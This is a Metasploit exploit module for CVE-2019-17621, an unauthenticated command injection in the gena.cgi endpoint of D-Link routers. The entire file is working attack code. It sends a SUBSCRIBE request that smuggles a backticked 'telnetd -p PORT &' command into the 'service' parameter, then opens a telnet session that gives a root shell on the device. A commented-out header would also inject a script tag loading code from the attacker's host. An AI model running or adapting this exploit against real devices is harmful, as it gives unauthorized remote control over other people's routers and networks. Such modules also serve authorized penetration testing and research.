##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'D-Link Devices Unauthenticated Remote Command Execution',
      'Description' => %q{
        Various D-Link Routers are vulnerable to OS command injection via the web
        interface. The vulnerability exists in gena.cgi, which is accessible without
        credentials. According to the vulnerability discoverer, more D-Link devices
        may be affected.
      },
      'Author'      =>
        [
          's1kr10s',
          'secenv'
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2019–17621' ],
          [ 'URL', 'https://medium.com/@s1kr10s/d94b47a15104' ]
        ],
      'DisclosureDate' => 'Dec 24 2019',
      'Privileged'     => true,
      'Platform'       => 'unix',
      'Arch'        => ARCH_CMD,
      'Payload'     =>
        {
          'Compat'  => {
            'PayloadType'    => 'cmd_interact',
            'ConnectionType' => 'find',
          },
        },
      'DefaultOptions' =>
        {
            'PAYLOAD' => 'cmd/unix/interact' ,
            'RPORT' => '49152'
        },
      'Targets'        =>
        [
          [ 'Automatic',	{ } ],
        ],
      'DefaultTarget'  => 0
      ))

    register_advanced_options(
      [
        OptInt.new('TelnetTimeout', [ true, 'The number of seconds to wait for a reply from a Telnet command', 10]),
        OptInt.new('TelnetBannerTimeout', [ true, 'The number of seconds to wait for the initial banner', 25])
      ])
  end

  def tel_timeout
    (datastore['TelnetTimeout'] || 10).to_i
  end

  def banner_timeout
    (datastore['TelnetBannerTimeout'] || 25).to_i
  end

  def exploit
    telnetport = rand(32767) + 32768

    print_status("#{rhost}:#{rport} - Telnetport: #{telnetport}")

    cmd = "telnetd -p #{telnetport} &"

    #starting the telnetd gives no response
    request(cmd)

    sleep 1

    print_status("#{rhost}:#{rport} - Trying to establish a telnet connection...")
    ctx = { 'Msf' => framework, 'MsfExploit' => self }
    sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => telnetport.to_i, 'Context' => ctx })

    if sock.nil?
      fail_with(Failure::Unreachable, "#{rhost}:#{rport} - Backdoor service has not been spawned!!!")
    end

    add_socket(sock)

    print_status("#{rhost}:#{rport} - Trying to establish a telnet session...")
    prompt = negotiate_telnet(sock)
    if prompt.nil?
      sock.close
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to establish a telnet session")
    else
      print_good("#{rhost}:#{rport} - Telnet session successfully established...")
    end

    handler(sock)
    if session_created?
        remove_socket(sock)
    end
  end

  def request(cmd)

    uri = "/gena.cgi?service=`#{cmd}`"

    begin
      res = send_request_raw({
        'uri'    => uri,
        'method' => 'SUBSCRIBE',
        'headers' =>
        {
                'Callback' => '<http://192.168.0.4:34033/ServiceProxy27>',
                'NT' => 'upnp:event',
                'Timeout' => 'Second-1800',
                # 'User-Agent' => "Mozilla Firefox <script language=\"JavaScript\" src=\"http://#{datastore['lhost']}:#{datastore['SRVPORT']}/#{datastore['uripath']}\">",
             },
      })
    return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{rhost}:#{rport} - Could not connect to the webservice")
    end
  end

  # Since there isn't user/password negotiation, just wait until the prompt is there
  def negotiate_telnet(sock)
    begin
      Timeout.timeout(banner_timeout) do
        while(true)
          data = sock.get_once(-1, tel_timeout)
          return nil if not data or data.length == 0
          if data =~ /\x23\x20$/
            return true
          end
        end
      end
    rescue ::Timeout::Error
      return nil
    end
  end
end
